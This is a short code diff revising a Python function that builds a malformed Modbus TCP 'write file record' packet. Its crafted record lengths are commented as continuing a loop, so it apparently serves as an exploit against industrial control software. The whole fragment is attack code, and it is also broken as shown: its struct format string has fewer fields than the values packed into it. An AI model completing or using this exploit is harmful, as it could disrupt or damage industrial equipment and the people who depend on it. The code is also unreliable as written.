@@ -5,11 +5,11 @@ def create_exploit_packet():
     # Modbus TCP header
     transaction_id = 0x0001
     protocol_id = 0x0000
-    length = 0x0013  # Adjusted length for additional payload
+    length = 0x0014  # Adjusted length for additional payload
     unit_id = 0x01
 
     # Modbus function code and payload
-    function code = 0x15  # Example function code
+    function_code = 0x15  # Example function code
     reference_type = 0x06  # Correct reference type for file record request
     file_number = 0x0001
     record_number = 0x0000
@@ -17,7 +17,7 @@ def create_exploit_packet():
     record_length_2 = 0xfffb  # Second record length to continue the loop
 
     # Construct the payload
-    payload = struct.pack('>BHHHBHHH', reference_type, file_number, record_number, record_length_1, 0xFF, reference_type, file_number, record_number, record_length_2)
+    payload = struct.pack('>BHHHBHHH', function_code, reference_type, file_number, record_number, record_length_1, 0xFF, reference_type, file_number, record_number, record_length_2)
 
     # Construct the Modbus TCP packet
     modbus_packet = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + payload
